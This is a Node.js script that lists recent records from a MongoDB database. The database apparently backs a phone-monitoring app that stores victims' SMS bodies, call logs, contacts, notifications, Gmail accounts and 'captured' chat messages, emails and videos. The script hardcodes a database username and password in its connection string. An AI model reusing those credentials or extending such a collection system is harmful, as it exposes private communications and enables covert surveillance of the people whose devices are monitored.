const mongoose = require('mongoose');
require('dotenv').config();

// Connect to MongoDB
mongoose.connect(process.env.MONGODB_URI || 'mongodb+srv://mbilal:mbilal123@cluster0.ey6gj6g.mongodb.net/mob_notifications', {
  useNewUrlParser: true,
  useUnifiedTopology: true
});

// Import models
const User = require('./models/User');
const Device = require('./models/Device');
const Notification = require('./models/Notification');
const Email = require('./models/Email');
const SMS = require('./models/SMS');
const CallLog = require('./models/CallLog');
const Contact = require('./models/Contact');
const GmailAccount = require('./models/GmailAccount');
const Video = require('./models/Video');
const Media = require('./models/Media');
const CaptureMessage = require('./models/CaptureMessages');
const CaptureEmail = require('./models/CaptureEmails');
const CaptureVideo = require('./models/CaptureVideos');

async function viewAllData() {
  try {
    console.log('🔍 VIEWING ALL DATA IN MONGODB\n');
    console.log('=' .repeat(60));

    // Users
    console.log('\n👥 USERS:');
    const users = await User.find({}).sort({ createdAt: -1 }).limit(5);
    console.log(`Total users: ${await User.countDocuments()}`);
    users.forEach((user, index) => {
      console.log(`${index + 1}. ${user.username} (${user.email}) - Device: ${user.deviceId}`);
    });

    // Devices
    console.log('\n📱 DEVICES:');
    const devices = await Device.find({}).sort({ createdAt: -1 }).limit(5);
    console.log(`Total devices: ${await Device.countDocuments()}`);
    devices.forEach((device, index) => {
      console.log(`${index + 1}. Device ID: ${device.deviceId} - Apps: ${device.installedApps?.length || 0}`);
    });

    // Notifications
    console.log('\n🔔 NOTIFICATIONS:');
    const notifications = await Notification.find({}).sort({ timestamp: -1 }).limit(5);
    console.log(`Total notifications: ${await Notification.countDocuments()}`);
    notifications.forEach((notification, index) => {
      console.log(`${index + 1}. [${notification.appName}] ${notification.title} - ${notification.deviceId}`);
    });

    // Emails
    console.log('\n📧 EMAILS:');
    const emails = await Email.find({}).sort({ timestamp: -1 }).limit(5);
    console.log(`Total emails: ${await Email.countDocuments()}`);
    emails.forEach((email, index) => {
      console.log(`${index + 1}. From: ${email.from} | Subject: ${email.subject} - ${email.deviceId}`);
    });

    // SMS
    console.log('\n💬 SMS MESSAGES:');
    const sms = await SMS.find({}).sort({ timestamp: -1 }).limit(5);
    console.log(`Total SMS: ${await SMS.countDocuments()}`);
    sms.forEach((message, index) => {
      console.log(`${index + 1}. From: ${message.sender} | Body: ${message.body?.substring(0, 50)}...`);
    });

    // Call Logs
    console.log('\n📞 CALL LOGS:');
    const callLogs = await CallLog.find({}).sort({ timestamp: -1 }).limit(5);
    console.log(`Total call logs: ${await CallLog.countDocuments()}`);
    callLogs.forEach((call, index) => {
      console.log(`${index + 1}. ${call.number} - ${call.type} - ${call.duration}s`);
    });

    // Contacts
    console.log('\n👤 CONTACTS:');
    const contacts = await Contact.find({}).sort({ createdAt: -1 }).limit(5);
    console.log(`Total contacts: ${await Contact.countDocuments()}`);
    contacts.forEach((contact, index) => {
      console.log(`${index + 1}. ${contact.name} - ${contact.phone} - ${contact.deviceId}`);
    });

    // Gmail Accounts
    console.log('\n📮 GMAIL ACCOUNTS:');
    const gmailAccounts = await GmailAccount.find({}).sort({ createdAt: -1 }).limit(5);
    console.log(`Total Gmail accounts: ${await GmailAccount.countDocuments()}`);
    gmailAccounts.forEach((account, index) => {
      console.log(`${index + 1}. ${account.email} - ${account.deviceId}`);
    });

    // Videos
    console.log('\n🎥 VIDEOS:');
    const videos = await Video.find({}).sort({ createdAt: -1 }).limit(5);
    console.log(`Total videos: ${await Video.countDocuments()}`);
    videos.forEach((video, index) => {
      console.log(`${index + 1}. ${video.title} - ${video.category} - ${video.views} views`);
    });

    // Media
    console.log('\n📸 MEDIA:');
    const media = await Media.find({}).sort({ uploadDate: -1 }).limit(5);
    console.log(`Total media files: ${await Media.countDocuments()}`);
    media.forEach((file, index) => {
      console.log(`${index + 1}. ${file.originalName} - ${file.type} - ${file.size} bytes`);
    });

    // Capture Messages
    console.log('\n💬 CAPTURE MESSAGES:');
    const captureMessages = await CaptureMessage.find({}).sort({ timestamp: -1 }).limit(5);
    console.log(`Total capture messages: ${await CaptureMessage.countDocuments()}`);
    captureMessages.forEach((message, index) => {
      console.log(`${index + 1}. [${message.platform}] ${message.sender}: ${message.content?.substring(0, 50)}...`);
    });

    // Capture Emails
    console.log('\n📧 CAPTURE EMAILS:');
    const captureEmails = await CaptureEmail.find({}).sort({ timestamp: -1 }).limit(5);
    console.log(`Total capture emails: ${await CaptureEmail.countDocuments()}`);
    captureEmails.forEach((email, index) => {
      console.log(`${index + 1}. [${email.platform}] From: ${email.from} | Subject: ${email.subject}`);
    });

    // Capture Videos
    console.log('\n🎥 CAPTURE VIDEOS:');
    const captureVideos = await CaptureVideo.find({}).sort({ timestamp: -1 }).limit(5);
    console.log(`Total capture videos: ${await CaptureVideo.countDocuments()}`);
    captureVideos.forEach((video, index) => {
      console.log(`${index + 1}. [${video.platform}] ${video.originalName} - ${video.fileSize} bytes`);
    });

    console.log('\n' + '=' .repeat(60));
    console.log('✅ Data viewing completed!');

  } catch (error) {
    console.error('Error viewing data:', error);
  } finally {
    mongoose.connection.close();
  }
}

viewAllData(); 